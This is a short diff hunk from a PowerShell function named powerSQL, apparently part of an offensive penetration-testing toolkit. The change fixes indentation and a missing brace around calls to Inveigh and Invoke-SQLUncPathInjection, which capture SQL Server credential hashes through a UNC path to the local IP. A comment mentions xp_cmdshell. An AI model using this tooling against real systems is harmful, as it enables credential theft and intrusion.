@@ -1228,7 +1228,8 @@ function powerSQL
         {
             $smbip = Get-currentIP
             Inveigh
-	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress    
+	        Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress
+        }    
 	}
     # XP_Cmdshell functions follow - maybe.
 	      
